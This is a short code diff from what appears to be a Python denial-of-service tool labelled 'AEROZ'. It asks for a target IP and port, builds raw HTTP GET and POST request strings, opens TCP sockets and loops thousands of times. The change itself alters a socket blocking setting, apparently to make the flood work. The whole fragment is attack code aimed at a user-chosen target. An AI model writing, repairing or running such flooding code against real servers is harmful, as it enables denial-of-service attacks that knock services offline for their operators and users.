@@ -3670,7 +3670,6 @@ acceptall = [""]
 #socks5 = [""]
 ip = str(input("IP TARGET :"))
 port = int(input("PORT TARGET :"))
-s.setblocking(True)
 get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
 post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
 get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
@@ -3696,7 +3695,7 @@ def rand_ua():
 ddos = 'AEROZ '
 print("AEROZ R1")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setblocking(0)
+s.setblocking(True)
 a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 duration = 10000
 for x in range(20000):
